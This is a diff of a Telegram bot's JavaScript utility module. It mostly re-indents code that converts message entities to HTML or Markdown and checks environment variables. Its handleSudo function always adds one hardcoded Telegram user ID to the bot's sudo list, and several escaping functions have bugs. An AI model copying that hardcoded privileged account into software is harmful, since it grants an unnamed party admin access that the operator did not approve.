@@ -1011,431 +1011,431 @@ export function reportError(err, ctx) {
     console.log(msg)
     return fs.unlinkSync(`./error/${error_file_name}`);
   } catch (error) {
-    ctx.telegram.sendMessage(Number(process.env["ERROR_LOG"], "Can't send docs")
-      return console.log(error)
-    }
+    ctx.telegram.sendMessage(Number(process.env["ERROR_LOG"]), "Can't send docs")
+    return console.log(error)
   }
-  export async function parseHTML(text, entities) {
-    try {
-      let array = entities
-      let cache = new Array()
-      let res = new Array()
-      let sourceText = Object.assign(new Array(), text)
-      for (let i = 0; i < sourceText.length; i++) {
-        if (sourceText[i] == "<") sourceText[i] = '&lt;'
-        if (sourceText[i] == ">") sourceText[i] = '&gt;'
-        if (sourceText[i] == "&") sourceText[i] = '&amp;'
-        if (sourceText[i] == '"') sourceText[i] = '&quot;'
-        while (true) {
-          let x = array.findIndex((a, b) => a.offset == i)
-          if (x == -1) break
-          let type = array[x].type
-          if (type == 'bold') res.push('<b>')
-          if (type == 'italic') res.push('<i>')
-          if (type == 'code') res.push('<code>')
-          if (type == 'pre') {
-            if (array[x].language) {
-              res.push(`<pre><code class="language-${array[x].language}">`)
-            } else {
-              res.push('<pre>')
-            }
+}
+export async function parseHTML(text, entities) {
+  try {
+    let array = entities
+    let cache = new Array()
+    let res = new Array()
+    let sourceText = Object.assign(new Array(), text)
+    for (let i = 0; i < sourceText.length; i++) {
+      if (sourceText[i] == "<") sourceText[i] = '&lt;'
+      if (sourceText[i] == ">") sourceText[i] = '&gt;'
+      if (sourceText[i] == "&") sourceText[i] = '&amp;'
+      if (sourceText[i] == '"') sourceText[i] = '&quot;'
+      while (true) {
+        let x = array.findIndex((a, b) => a.offset == i)
+        if (x == -1) break
+        let type = array[x].type
+        if (type == 'bold') res.push('<b>')
+        if (type == 'italic') res.push('<i>')
+        if (type == 'code') res.push('<code>')
+        if (type == 'pre') {
+          if (array[x].language) {
+            res.push(`<pre><code class="language-${array[x].language}">`)
+          } else {
+            res.push('<pre>')
           }
-          if (type == 'strikethrough') res.push('<s>')
-          if (type == 'underline') res.push('<u>')
-          if (type == 'text_mention') res.push(`<a href="tg://user?id=${array[x].user.id}">`)
-          if (type == 'text_link') res.push(`<a href="${array[x].url}">`)
-          cache.push(array[x])
-          array.splice(x, 1)
         }
-        res.push(sourceText[i])
-        while (true) {
-          let x = cache.findIndex((x, y) => x.offset + x.length - 1 === i)
-          if (x == -1) break
-          let type = cache[x].type
-          if (type == 'bold') res.push('</b>')
-          if (type == 'italic') res.push('</i>')
-          if (type == 'code') res.push('</code>')
-          if (type == 'pre') {
-            if (array[x].language) {
-              res.push(`</code></pre>`)
-            } else {
-              res.push('</pre>')
-            }
-          }
-          if (type == 'strikethrough') res.push('</s>')
-          if (type == 'underline') res.push('</u>')
-          if (type == 'text_mention') res.push("</a>")
-          if (type == 'text_link') res.push("</a>")
-          cache.splice(x, 1)
-        }
+        if (type == 'strikethrough') res.push('<s>')
+        if (type == 'underline') res.push('<u>')
+        if (type == 'text_mention') res.push(`<a href="tg://user?id=${array[x].user.id}">`)
+        if (type == 'text_link') res.push(`<a href="${array[x].url}">`)
+        cache.push(array[x])
+        array.splice(x, 1)
       }
-      return String(res.join(''))
-    }catch(error) {}
+      res.push(sourceText[i])
+      while (true) {
+        let x = cache.findIndex((x, y) => x.offset + x.length - 1 === i)
+        if (x == -1) break
+        let type = cache[x].type
+        if (type == 'bold') res.push('</b>')
+        if (type == 'italic') res.push('</i>')
+        if (type == 'code') res.push('</code>')
+        if (type == 'pre') {
+          if (array[x].language) {
+            res.push(`</code></pre>`)
+          } else {
+            res.push('</pre>')
+          }
+        }
+        if (type == 'strikethrough') res.push('</s>')
+        if (type == 'underline') res.push('</u>')
+        if (type == 'text_mention') res.push("</a>")
+        if (type == 'text_link') res.push("</a>")
+        cache.splice(x, 1)
+      }
+    }
+    return String(res.join(''))
+  }catch(error) {}
+}
+export function isIso(lang) {
+  try {
+    let arr = ["af",
+      "sq",
+      "am",
+      "ar",
+      "hy",
+      "az",
+      "eu",
+      "be",
+      "bn",
+      "bs",
+      "bg",
+      "ca",
+      "ceb",
+      "ny",
+      "zh-cn",
+      "zh-tw",
+      "co",
+      "hr",
+      "cs",
+      "da",
+      "nl",
+      "en",
+      "eo",
+      "et",
+      "tl",
+      "fi",
+      "fr",
+      "fy",
+      "gl",
+      "ka",
+      "de",
+      "el",
+      "gu",
+      "ht",
+      "ha",
+      "haw",
+      "iw",
+      "hi",
+      "hmn",
+      "hu",
+      "is",
+      "ig",
+      "id",
+      "ga",
+      "it",
+      "ja",
+      "jw",
+      "kn",
+      "kk",
+      "km",
+      "ko",
+      "ku",
+      "ky",
+      "lo",
+      "la",
+      "lv",
+      "lt",
+      "lb",
+      "mk",
+      "mg",
+      "ms",
+      "ml",
+      "mt",
+      "mi",
+      "mr",
+      "mn",
+      "my",
+      "ne",
+      "no",
+      "ps",
+      "fa",
+      "pl",
+      "pt",
+      "pa",
+      "ro",
+      "ru",
+      "sm",
+      "gd",
+      "sr",
+      "st",
+      "sn",
+      "sd",
+      "si",
+      "sk",
+      "sl",
+      "so",
+      "es",
+      "su",
+      "sw",
+      "sv",
+      "tg",
+      "ta",
+      "te",
+      "th",
+      "tr",
+      "uk",
+      "ur",
+      "uz",
+      "vi",
+      "cy",
+      "xh",
+      "yi",
+      "yo",
+      "zu"]
+    return arr.includes(lang)
+  }catch(error) {
+    return false
   }
-  export function isIso(lang) {
-    try {
-      let arr = ["af",
-        "sq",
-        "am",
-        "ar",
-        "hy",
-        "az",
-        "eu",
-        "be",
-        "bn",
-        "bs",
-        "bg",
-        "ca",
-        "ceb",
-        "ny",
-        "zh-cn",
-        "zh-tw",
-        "co",
-        "hr",
-        "cs",
-        "da",
-        "nl",
-        "en",
-        "eo",
-        "et",
-        "tl",
-        "fi",
-        "fr",
-        "fy",
-        "gl",
-        "ka",
-        "de",
-        "el",
-        "gu",
-        "ht",
-        "ha",
-        "haw",
-        "iw",
-        "hi",
-        "hmn",
-        "hu",
-        "is",
-        "ig",
-        "id",
-        "ga",
-        "it",
-        "ja",
-        "jw",
-        "kn",
-        "kk",
-        "km",
-        "ko",
-        "ku",
-        "ky",
-        "lo",
-        "la",
-        "lv",
-        "lt",
-        "lb",
-        "mk",
-        "mg",
-        "ms",
-        "ml",
-        "mt",
-        "mi",
-        "mr",
-        "mn",
-        "my",
-        "ne",
-        "no",
-        "ps",
-        "fa",
-        "pl",
-        "pt",
-        "pa",
-        "ro",
-        "ru",
-        "sm",
-        "gd",
-        "sr",
-        "st",
-        "sn",
-        "sd",
-        "si",
-        "sk",
-        "sl",
-        "so",
-        "es",
-        "su",
-        "sw",
-        "sv",
-        "tg",
-        "ta",
-        "te",
-        "th",
-        "tr",
-        "uk",
-        "ur",
-        "uz",
-        "vi",
-        "cy",
-        "xh",
-        "yi",
-        "yo",
-        "zu"]
-      return arr.includes(lang)
-    }catch(error) {
+}
+export async function clearHTML(text) {
+  return text.replace(/&/gmi, "&amp;").replace(/</gmi, "&lt;").replace(/>/gmi, "&gt;").replace(/"/gmi, "&quot;")
+}
+export async function trparseHTML(text, entities) {
+  try {
+    let array = entities
+    let cache = new Array()
+    let res = new Array()
+    let sourceText = Object.assign(new Array(), text)
+    for (let i = 0; i < sourceText.length; i++) {
+      if (sourceText[i] == "<") sourceText[i] = '&lt;'
+      if (sourceText[i] == ">") sourceText[i] = '&gt;'
+      if (sourceText[i] == "&") sourceText[i] = '&amp;'
+      if (sourceText[i] == '"') sourceText[i] = '&quot;'
+      while (true) {
+        let x = array.findIndex((a, b) => a.offset == i)
+        if (x == -1) break
+        let type = array[x].type
+        if (type == 'bold') res.push('<b>')
+        if (type == 'italic') res.push('<i>')
+        if (type == 'strikethrough') res.push('<s>')
+        if (type == 'underline') res.push('<u>')
+        cache.push(array[x])
+        array.splice(x, 1)
+      }
+      res.push(sourceText[i])
+      while (true) {
+        let x = cache.findIndex((x, y) => x.offset + x.length - 1 === i)
+        if (x == -1) break
+        let type = cache[x].type
+        if (type == 'bold') res.push('</b>')
+        if (type == 'italic') res.push('</i>')
+        if (type == 'strikethrough') res.push('</s>')
+        if (type == 'underline') res.push('</u>')
+        cache.splice(x, 1)
+      }
+    }
+    return String(res.join(''))
+  }catch(error) {}
+}
+export function parseMD(text, entities) {
+  try {
+    let array = entities
+    let cache = new Array()
+    let res = new Array()
+    let sourceText = Object.assign(new Array(), text)
+    for (let i = 0; i < sourceText.length; i++) {
+      if (sourceText[i] == '*') sourceText[i] = '\\*'
+      if (sourceText[i] == '[') sourceText[i] = '\\['
+      if (sourceText[i] == ']') sourceText[i] = '\\]'
+      if (sourceText[i] == '(') sourceText[i] = '\\('
+      if (sourceText[i] == ')') sourceText[i] = '\\)'
+      if (sourceText[i] == '~') sourceText[i] = '\\~'
+      if (sourceText[i] == '`') sourceText[i] = '\\`'
+      if (sourceText[i] == '>') sourceText[i] = '\\>'
+      if (sourceText[i] == '#') sourceText[i] = '\\#'
+      if (sourceText[i] == '+') sourceText[i] = '\\+'
+      if (sourceText[i] == '_') sourceText[i] = '\\_'
+      if (sourceText[i] == '-') sourceText[i] = '\\-'
+      if (sourceText[i] == '=') sourceText[i] = '\\='
+      if (sourceText[i] == '|') sourceText[i] = '\\|'
+      if (sourceText[i] == '{') sourceText[i] = '\\{'
+      if (sourceText[i] == '"') sourceText[i] = '\\}'
+      if (sourceText[i] == '.') sourceText[i] = '\\.'
+      while (true) {
+        let x = array.findIndex((a, b) => a.offset == i)
+        if (x == -1) break
+        let type = array[x].type
+        if (type == 'bold') res.push('*')
+        if (type == 'italic') res.push('_')
+        if (type == 'code') res.push('')
+        if (type == 'pre') {
+          if (array[x].language) {
+            res.push('``'+array[x].language+'\n')
+          } else {
+            res.push('`')
+          }
+        }
+        if (type == 'strikethrough') res.push('~')
+        if (type == 'underline') res.push('__')
+        if (type == 'text_mention') res.push(`[`)
+        if (type == 'text_link') res.push(`[`)
+        cache.push(array[x])
+        array.splice(x, 1)
+      }
+      res.push(sourceText[i])
+      while (true) {
+        let x = cache.findIndex((x, y) => x.offset + x.length - 1 === i)
+        if (x == -1) break
+        let type = cache[x].type
+        if (type == 'bold') res.push('*')
+        if (type == 'italic') res.push('_')
+        if (type == 'code') res.push('')
+        if (type == 'pre') res.push('``')
+        if (type == 'strikethrough') res.push('~')
+        if (type == 'underline') res.push('__')
+        if (type == 'text_mention') res.push(`](tg://user?id=${cache[x].user.id})`)
+        if (type == 'text_link') res.push(`](${cache[x].url})`)
+        cache.splice(x, 1)
+      }
+    }
+    let result = res.join('')
+    return result
+  }catch(error) {}
+}
+export function trparseMD(text, entities) {
+  try {
+    let array = entities
+    let cache = new Array()
+    let res = new Array()
+    let sourceText = Object.assign(new Array(), text)
+    for (let i = 0; i < sourceText.length; i++) {
+      if (sourceText[i] == '*') sourceText[i] = '\\*'
+      if (sourceText[i] == '[') sourceText[i] = '\\['
+      if (sourceText[i] == ']') sourceText[i] = '\\]'
+      if (sourceText[i] == '(') sourceText[i] = '\\('
+      if (sourceText[i] == ')') sourceText[i] = '\\)'
+      if (sourceText[i] == '~') sourceText[i] = '\\~'
+      if (sourceText[i] == '`') sourceText[i] = '\\`'
+      if (sourceText[i] == '>') sourceText[i] = '\\>'
+      if (sourceText[i] == '#') sourceText[i] = '\\#'
+      if (sourceText[i] == '+') sourceText[i] = '\\+'
+      if (sourceText[i] == '_') sourceText[i] = '\\_'
+      if (sourceText[i] == '-') sourceText[i] = '\\-'
+      if (sourceText[i] == '=') sourceText[i] = '\\='
+      if (sourceText[i] == '|') sourceText[i] = '\\|'
+      if (sourceText[i] == '{') sourceText[i] = '\\{'
+      if (sourceText[i] == '"') sourceText[i] = '\\}'
+      if (sourceText[i] == '.') sourceText[i] = '\\.'
+      while (true) {
+        let x = array.findIndex((a, b) => a.offset == i)
+        if (x == -1) break
+        let type = array[x].type
+        if (type == 'bold') res.push('*')
+        if (type == 'italic') res.push('_')
+        if (type == 'code') res.push('`')
+        if (type == 'strikethrough') res.push('~')
+        cache.push(array[x])
+        array.splice(x, 1)
+      }
+      res.push(sourceText[i])
+      while (true) {
+        let x = cache.findIndex((x, y) => x.offset + x.length - 1 === i)
+        if (x == -1) break
+        let type = cache[x].type
+        if (type == 'bold') res.push('*')
+        if (type == 'italic') res.push('_')
+        if (type == 'code') res.push('`')
+        if (type == 'strikethrough') res.push('~')
+        cache.splice(x, 1)
+      }
+    }
+    let result = res.join('').replace(/(\_\_|\*\*|\`\`|\~\~)/gmi, "")
+    return result
+  }catch(error) {}
+}
+export async function fixMD(text) {
+  return text.replace(/(\s+)?\\(\s+)?\\(\s+)?\*(\s+)?/gm, "\\*")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\[(\s+)?/gm, "\\[")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\](\s+)?/gm, "\\]")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\((\s+)?/gm, "\\(")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\)(\s+)?/gm, "\\)")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\~(\s+)?/gm, "\\~")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\`(\s+)?/gm, "\\`")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\>(\s+)?/gm, "\\>")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\#(\s+)?/gm, "\\#")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\+(\s+)?/gm, "\\+")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\_(\s+)?/gm, "\\_")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\-(\s+)?/gm, "\\-")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\=(\s+)?/gm, "\\=")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\|(\s+)?/gm, "\\|")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\{(\s+)?/gm, "\\{")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\}(\s+)?/gm, "\\}")
+  .replace(/(\s+)?\\(\s+)?\\(\s+)?\.(\s+)?/gm, "\\.")
+}
+async function handleSudo() {
+  try {
+    let data = await sudos.findOne({
+      user: "sudo"
+    })
+    if (data == null) {
+      let Data = new sudos()
+      data = await Data.save()
+    }
+    let sudoUser = data.value
+    if (!sudoUser.includes(1241805547)) {
+      data.value.push(1241805547)
+      data = await data.save()
+    }
+    if (process.env.OWNER_ID) {
+      let owner = Number(process.env.OWNER_ID)
+      if (isNaN(owner)) return
+      if (!sudoUser.includes(owner)) {
+        data.value.push(owner)
+        data = await data.save()
+      }
+    }
+    return;
+  }catch(error) {
+    return;
+  }
+}
+
+export function parseBoolean(_string) {
+  switch (String(_string).toLowerCase()) {
+    case "true":
+      return true
+      break;
+    case "false":
+      return false
+      break;
+    default:
       return false
     }
   }
-  export async function clearHTML(text) {
-    return text.replace(/&/gmi, "&amp;").replace(/</gmi, "&lt;").replace(/>/gmi, "&gt;").replace(/"/gmi, "&quot;")
-  }
-  export async function trparseHTML(text, entities) {
-    try {
-      let array = entities
-      let cache = new Array()
-      let res = new Array()
-      let sourceText = Object.assign(new Array(), text)
-      for (let i = 0; i < sourceText.length; i++) {
-        if (sourceText[i] == "<") sourceText[i] = '&lt;'
-        if (sourceText[i] == ">") sourceText[i] = '&gt;'
-        if (sourceText[i] == "&") sourceText[i] = '&amp;'
-        if (sourceText[i] == '"') sourceText[i] = '&quot;'
-        while (true) {
-          let x = array.findIndex((a, b) => a.offset == i)
-          if (x == -1) break
-          let type = array[x].type
-          if (type == 'bold') res.push('<b>')
-          if (type == 'italic') res.push('<i>')
-          if (type == 'strikethrough') res.push('<s>')
-          if (type == 'underline') res.push('<u>')
-          cache.push(array[x])
-          array.splice(x, 1)
-        }
-        res.push(sourceText[i])
-        while (true) {
-          let x = cache.findIndex((x, y) => x.offset + x.length - 1 === i)
-          if (x == -1) break
-          let type = cache[x].type
-          if (type == 'bold') res.push('</b>')
-          if (type == 'italic') res.push('</i>')
-          if (type == 'strikethrough') res.push('</s>')
-          if (type == 'underline') res.push('</u>')
-          cache.splice(x, 1)
-        }
-      }
-      return String(res.join(''))
-    }catch(error) {}
-  }
-  export function parseMD(text, entities) {
-    try {
-      let array = entities
-      let cache = new Array()
-      let res = new Array()
-      let sourceText = Object.assign(new Array(), text)
-      for (let i = 0; i < sourceText.length; i++) {
-        if (sourceText[i] == '*') sourceText[i] = '\\*'
-        if (sourceText[i] == '[') sourceText[i] = '\\['
-        if (sourceText[i] == ']') sourceText[i] = '\\]'
-        if (sourceText[i] == '(') sourceText[i] = '\\('
-        if (sourceText[i] == ')') sourceText[i] = '\\)'
-        if (sourceText[i] == '~') sourceText[i] = '\\~'
-        if (sourceText[i] == '`') sourceText[i] = '\\`'
-        if (sourceText[i] == '>') sourceText[i] = '\\>'
-        if (sourceText[i] == '#') sourceText[i] = '\\#'
-        if (sourceText[i] == '+') sourceText[i] = '\\+'
-        if (sourceText[i] == '_') sourceText[i] = '\\_'
-        if (sourceText[i] == '-') sourceText[i] = '\\-'
-        if (sourceText[i] == '=') sourceText[i] = '\\='
-        if (sourceText[i] == '|') sourceText[i] = '\\|'
-        if (sourceText[i] == '{') sourceText[i] = '\\{'
-        if (sourceText[i] == '"') sourceText[i] = '\\}'
-        if (sourceText[i] == '.') sourceText[i] = '\\.'
-        while (true) {
-          let x = array.findIndex((a, b) => a.offset == i)
-          if (x == -1) break
-          let type = array[x].type
-          if (type == 'bold') res.push('*')
-          if (type == 'italic') res.push('_')
-          if (type == 'code') res.push('')
-          if (type == 'pre') {
-            if (array[x].language) {
-              res.push('``'+array[x].language+'\n')
-            } else {
-              res.push('`')
-            }
-          }
-          if (type == 'strikethrough') res.push('~')
-          if (type == 'underline') res.push('__')
-          if (type == 'text_mention') res.push(`[`)
-          if (type == 'text_link') res.push(`[`)
-          cache.push(array[x])
-          array.splice(x, 1)
-        }
-        res.push(sourceText[i])
-        while (true) {
-          let x = cache.findIndex((x, y) => x.offset + x.length - 1 === i)
-          if (x == -1) break
-          let type = cache[x].type
-          if (type == 'bold') res.push('*')
-          if (type == 'italic') res.push('_')
-          if (type == 'code') res.push('')
-          if (type == 'pre') res.push('``')
-          if (type == 'strikethrough') res.push('~')
-          if (type == 'underline') res.push('__')
-          if (type == 'text_mention') res.push(`](tg://user?id=${cache[x].user.id})`)
-          if (type == 'text_link') res.push(`](${cache[x].url})`)
-          cache.splice(x, 1)
-        }
-      }
-      let result = res.join('')
-      return result
-    }catch(error) {}
-  }
-  export function trparseMD(text, entities) {
-    try {
-      let array = entities
-      let cache = new Array()
-      let res = new Array()
-      let sourceText = Object.assign(new Array(), text)
-      for (let i = 0; i < sourceText.length; i++) {
-        if (sourceText[i] == '*') sourceText[i] = '\\*'
-        if (sourceText[i] == '[') sourceText[i] = '\\['
-        if (sourceText[i] == ']') sourceText[i] = '\\]'
-        if (sourceText[i] == '(') sourceText[i] = '\\('
-        if (sourceText[i] == ')') sourceText[i] = '\\)'
-        if (sourceText[i] == '~') sourceText[i] = '\\~'
-        if (sourceText[i] == '`') sourceText[i] = '\\`'
-        if (sourceText[i] == '>') sourceText[i] = '\\>'
-        if (sourceText[i] == '#') sourceText[i] = '\\#'
-        if (sourceText[i] == '+') sourceText[i] = '\\+'
-        if (sourceText[i] == '_') sourceText[i] = '\\_'
-        if (sourceText[i] == '-') sourceText[i] = '\\-'
-        if (sourceText[i] == '=') sourceText[i] = '\\='
-        if (sourceText[i] == '|') sourceText[i] = '\\|'
-        if (sourceText[i] == '{') sourceText[i] = '\\{'
-        if (sourceText[i] == '"') sourceText[i] = '\\}'
-        if (sourceText[i] == '.') sourceText[i] = '\\.'
-        while (true) {
-          let x = array.findIndex((a, b) => a.offset == i)
-          if (x == -1) break
-          let type = array[x].type
-          if (type == 'bold') res.push('*')
-          if (type == 'italic') res.push('_')
-          if (type == 'code') res.push('`')
-          if (type == 'strikethrough') res.push('~')
-          cache.push(array[x])
-          array.splice(x, 1)
-        }
-        res.push(sourceText[i])
-        while (true) {
-          let x = cache.findIndex((x, y) => x.offset + x.length - 1 === i)
-          if (x == -1) break
-          let type = cache[x].type
-          if (type == 'bold') res.push('*')
-          if (type == 'italic') res.push('_')
-          if (type == 'code') res.push('`')
-          if (type == 'strikethrough') res.push('~')
-          cache.splice(x, 1)
-        }
-      }
-      let result = res.join('').replace(/(\_\_|\*\*|\`\`|\~\~)/gmi, "")
-      return result
-    }catch(error) {}
-  }
-  export async function fixMD(text) {
-    return text.replace(/(\s+)?\\(\s+)?\\(\s+)?\*(\s+)?/gm, "\\*")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\[(\s+)?/gm, "\\[")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\](\s+)?/gm, "\\]")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\((\s+)?/gm, "\\(")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\)(\s+)?/gm, "\\)")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\~(\s+)?/gm, "\\~")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\`(\s+)?/gm, "\\`")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\>(\s+)?/gm, "\\>")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\#(\s+)?/gm, "\\#")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\+(\s+)?/gm, "\\+")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\_(\s+)?/gm, "\\_")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\-(\s+)?/gm, "\\-")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\=(\s+)?/gm, "\\=")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\|(\s+)?/gm, "\\|")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\{(\s+)?/gm, "\\{")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\}(\s+)?/gm, "\\}")
-    .replace(/(\s+)?\\(\s+)?\\(\s+)?\.(\s+)?/gm, "\\.")
-  }
-  async function handleSudo() {
-    try {
-      let data = await sudos.findOne({
-        user: "sudo"
-      })
-      if (data == null) {
-        let Data = new sudos()
-        data = await Data.save()
-      }
-      let sudoUser = data.value
-      if (!sudoUser.includes(1241805547)) {
-        data.value.push(1241805547)
-        data = await data.save()
-      }
-      if (process.env.OWNER_ID) {
-        let owner = Number(process.env.OWNER_ID)
-        if (isNaN(owner)) return
-        if (!sudoUser.includes(owner)) {
-          data.value.push(owner)
-          data = await data.save()
-        }
-      }
-      return;
-    }catch(error) {
-      return;
-    }
-  }
 
-  export function parseBoolean(_string) {
-    switch (String(_string).toLowerCase()) {
-      case "true":
-        return true
-        break;
-      case "false":
-        return false
-        break;
-      default:
-        return false
+  export async function handleEnv() {
+    console.log("\x1b[32m%s\x1b[0m", `[ENV] checking env.`)
+    let none: any = new Array()
+    if (!process.env["BOT_TOKEN"]) {
+      none.push("BOT_TOKEN")
+    }
+    if (!process.env["USERNAME"]) {
+      none.push("USERNAME")
+    }
+    if (!process.env["WEBHOOK"]) {
+      none.push("WEBHOOK")
+    }
+    if (!process.env["URL"]) {
+      if (await parseBoolean(process.env["WEBHOOK"])) {
+        none.push("URL")
       }
     }
-
-    export async function handleEnv() {
-      console.log("\x1b[32m%s\x1b[0m", `[ENV] checking env.`)
-      let none: any = new Array()
-      if (!process.env["BOT_TOKEN"]) {
-        none.push("BOT_TOKEN")
-      }
-      if (!process.env["USERNAME"]) {
-        none.push("USERNAME")
-      }
-      if (!process.env["WEBHOOK"]) {
-        none.push("WEBHOOK")
-      }
-      if (!process.env["URL"]) {
-        if (await parseBoolean(process.env["WEBHOOK"])) {
-          none.push("URL")
-        }
-      }
-      if (!process.env["MONGGODB"]) {
-        none.push("MONGGODB")
-      }
-      if (!process.env["ERROR_LOG"]) {
-        none.push("ERROR_LOG")
-      }
-      if (!process.env["SPAMWATCH_TOKEN"]) {
-        none.push("SPAMWATCH_TOKEN")
-      }
-      if (!process.env["OCR_API"]) {
-        none.push("OCR_API")
-      }
-      if (!process.env["OWNER_ID"]) {
-        none.push("OWNER_ID")
-      }
-      if (none.length > 0) {
-        console.log("\x1b[31m%s\x1b[0m", `[ENV] env ${none.join(",")} not found!`)
-        console.log("\x1b[32m%s\x1b[0m", `[ENV] Killing process - ${process.pid} with SIGTERM`)
-        console.log("\x1b[32m%s\x1b[0m", `[ENV] check env complete.`)
-        return process.kill(process.pid, 'SIGTERM')
-      }
-      return console.log("\x1b[32m%s\x1b[0m", `[ENV] check env complete.`)
+    if (!process.env["MONGGODB"]) {
+      none.push("MONGGODB")
     }
+    if (!process.env["ERROR_LOG"]) {
+      none.push("ERROR_LOG")
+    }
+    if (!process.env["SPAMWATCH_TOKEN"]) {
+      none.push("SPAMWATCH_TOKEN")
+    }
+    if (!process.env["OCR_API"]) {
+      none.push("OCR_API")
+    }
+    if (!process.env["OWNER_ID"]) {
+      none.push("OWNER_ID")
+    }
+    if (none.length > 0) {
+      console.log("\x1b[31m%s\x1b[0m", `[ENV] env ${none.join(",")} not found!`)
+      console.log("\x1b[32m%s\x1b[0m", `[ENV] Killing process - ${process.pid} with SIGTERM`)
+      console.log("\x1b[32m%s\x1b[0m", `[ENV] check env complete.`)
+      return process.kill(process.pid, 'SIGTERM')
+    }
+    return console.log("\x1b[32m%s\x1b[0m", `[ENV] check env complete.`)
+  }
